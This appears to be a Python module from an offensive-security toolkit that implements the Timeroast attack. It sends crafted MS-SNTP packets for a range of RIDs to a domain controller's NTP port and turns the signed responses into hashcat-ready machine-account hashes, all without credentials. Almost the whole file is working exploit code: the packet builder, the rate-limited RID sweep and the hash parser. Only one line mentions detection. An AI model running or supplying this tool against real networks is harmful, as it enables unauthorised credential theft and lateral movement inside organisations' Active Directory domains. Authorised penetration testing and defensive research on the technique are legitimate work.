"""
Timeroast — no-creds machine-account hash recovery (brief §4.5).

Tom Tervoort / Secura, 2024. The brief described it as "Kerberos AS-REQ
for sequential RIDs" but the actual published attack is NTP-based: the
DC's NTP service (UDP 123) signs MS-SNTP responses with the requesting
account's NTLM hash. Sending a crafted NTP packet keyed to RID N gets
back ``MD5(NT_HASH(machine_N) || ntp_data)`` — which hashcat mode
31300 cracks offline.

Why it matters: works **without credentials**. The only requirement is
UDP 123 reachable on the DC. For PJPT-style "I have network access but
no creds yet" workflows this is the cheapest first move — recover one
machine account hash and pivot.

Detection (defender side): unusual rate of MS-SNTP authenticated NTP
requests from a single source. Microsoft has not patched this — it's
a protocol design flaw.

Wire format
-----------
Request (68 bytes UDP):
    [48-byte NTP packet][4-byte key identifier][16-byte zero MAC]

Where the key identifier is ``RID | 0x80000000`` — the high bit marks
"machine account". The DC uses the machine account's NT hash as the
MAC key, so the response MAC is the cracking target.

Response (68 bytes UDP):
    [48-byte NTP response][4-byte key identifier][16-byte MD5 MAC]

Hashcat 31300 format:
    $sntp-ms$<MAC-hex>$<NTP-data-hex>

References
----------
- https://github.com/SecuraBV/Timeroast (original PoC)
- https://www.secura.com/blog/timeroasting-attacks-against-active-directory-using-ntp
"""

from __future__ import annotations

import socket
import struct
import time
from dataclasses import dataclass

# 48-byte NTP control packet — fixed prefix, copied verbatim from the
# Tervoort PoC. Burying it here as a hex literal so the whole packet
# is one line of source instead of a multi-line struct dance.
NTP_PREFIX = bytes.fromhex(
    "db0011e9000000000001000000000000"
    "00000000000000000000000000000000"
    "00000000000000000000000000000000"
)

# High bit on the key identifier marks "this is a machine account RID"
# — set by the client, used by the DC to look up the right NT hash.
MACHINE_ACCOUNT_FLAG = 0x80000000

NTP_PORT = 123
RESPONSE_LENGTH = 68          # 48 NTP + 4 key id + 16 MD5 MAC
SOCKET_BUFSIZE  = 256         # plenty for the 68-byte response


@dataclass
class TimeroastHash:
    """One captured machine-account hash, ready for offline cracking."""

    rid:        int
    hashcat:    str            # $sntp-ms$<mac>$<ntp_data>
    raw_mac:    bytes
    raw_ntp:    bytes

    @classmethod
    def from_response(cls, response: bytes) -> TimeroastHash | None:
        """Parse a DC response into a TimeroastHash. Returns None for
        malformed / wrong-length packets — DCs occasionally reply with
        unauthenticated NTP (no MAC) when something else is off."""
        if len(response) != RESPONSE_LENGTH:
            return None
        ntp_data = response[:48]
        key_id   = struct.unpack("<I", response[48:52])[0]
        mac      = response[52:68]
        rid      = key_id & ~MACHINE_ACCOUNT_FLAG
        return cls(
            rid     = rid,
            hashcat = f"$sntp-ms${mac.hex()}${ntp_data.hex()}",
            raw_mac = mac,
            raw_ntp = ntp_data,
        )


def build_request(rid: int) -> bytes:
    """Construct the 68-byte MS-SNTP authenticated request for ``rid``.
    The MAC field is zeroed — we're asking the DC to fill it in."""
    key_id = struct.pack("<I", rid | MACHINE_ACCOUNT_FLAG)
    return NTP_PREFIX + key_id + b"\x00" * 16


def parse_rid_range(spec: str) -> range:
    """Operator-supplied range like '1000-1500' or '1000'. Single ints
    expand to range(N, N+1) so the loop body is uniform.

    Raises ValueError on bad input — the CLI catches and pretty-prints."""
    spec = spec.strip()
    if "-" in spec:
        a_str, b_str = spec.split("-", 1)
        a, b = int(a_str), int(b_str)
        if a > b:
            raise ValueError(f"RID range start ({a}) > end ({b})")
        return range(a, b + 1)
    n = int(spec)
    return range(n, n + 1)


def timeroast(
    dc_ip:        str,
    rid_range:    range,
    *,
    rate:         int   = 180,    # packets/sec — Tervoort default
    timeout:      float = 5.0,
    socket_factory       = None,  # for tests; real callers leave None
):
    """Iterate ``rid_range``, send a Timeroast request per RID, yield
    ``TimeroastHash`` for every authenticated response.

    The DC won't always reply (RIDs that aren't machine accounts get
    nothing back) — silent skips are normal, not failures. ``rate``
    bounds the packet rate so a /16 RID sweep doesn't NXSecOps the DC.
    """
    sock = socket_factory() if socket_factory else _default_socket(timeout)
    delay = 1.0 / max(rate, 1)
    try:
        for rid in rid_range:
            sock.sendto(build_request(rid), (dc_ip, NTP_PORT))
            try:
                response, _ = sock.recvfrom(SOCKET_BUFSIZE)
            except TimeoutError:
                continue   # RID isn't a machine account, or DC dropped the packet
            parsed = TimeroastHash.from_response(response)
            if parsed:
                yield parsed
            if delay > 0:
                time.sleep(delay)
    finally:
        sock.close()


def _default_socket(timeout: float) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    return sock
